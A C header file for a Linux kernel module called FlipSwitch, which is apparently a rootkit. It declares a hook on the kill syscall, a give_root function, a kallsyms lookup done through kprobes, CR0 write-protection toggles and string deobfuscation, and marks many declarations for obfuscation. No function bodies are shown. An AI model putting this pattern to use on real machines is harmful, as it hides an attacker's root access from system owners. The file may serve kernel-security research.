#ifndef FLIPSWITCH_H
#define FLIPSWITCH_H

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>

/* Type definitions */
typedef asmlinkage long (*t_syscall)(const struct pt_regs *);

/* Init and exit functions */
static int __init flipswitch_init(void); // obfuscate
static void __exit flipswitch_exit(void); // obfuscate


/* Function prototypes */
void *find_kallsyms_lookup_name(void); // obfuscate
void *find_sym_pointer(const char *symbol_name); // obfuscate
asmlinkage int fake_kill(const struct pt_regs *regs); // obfuscate
void give_root(void); // obfuscate

/* Deobfuscation function prototype */
char *deobfuscate(const unsigned char *data, size_t len, unsigned char key); // obfuscate

/* Inline function prototypes for memory protection */
static inline void write_cr0_forced(unsigned long val); // obfuscate
static inline void enable_write_protection(void); // obfuscate
static inline void disable_write_protection(void); // obfuscate

/* Module information */
#define MODULE_NAME "FlipSwitch"
#define MODULE_AUTHOR_NAME "Remco Sprooten"
#define MODULE_DESC "FlipSwitch: Runtime Kernel Switch Statement Manipulation for Syscall Interception"
#define MODULE_VER "1.0"


/* Constants */
#define DUMP_SIZE 0x5000

/* Debug configuration */
#ifdef DEBUG
#define debug_printk(fmt, ...) printk(KERN_INFO "FlipSwitch: " fmt, ##__VA_ARGS__)
#else
#define debug_printk(fmt, ...) do { } while (0)
#endif

/* For IDE usage: O_STRING returns the input string as-is */
#define O_STRING(str) (str)

/* Global variables for syscall hooking */
static t_syscall original_kill_syscall = NULL; // obfuscate
static unsigned char *func_ptr = NULL; // obfuscate
static int hooked_offset = 0; // obfuscate
static int32_t original_target = 0; // obfuscate
void *kallsyms_lookup_name_addr = NULL; // obfuscate

#endif /* FLIPSWITCH_H */
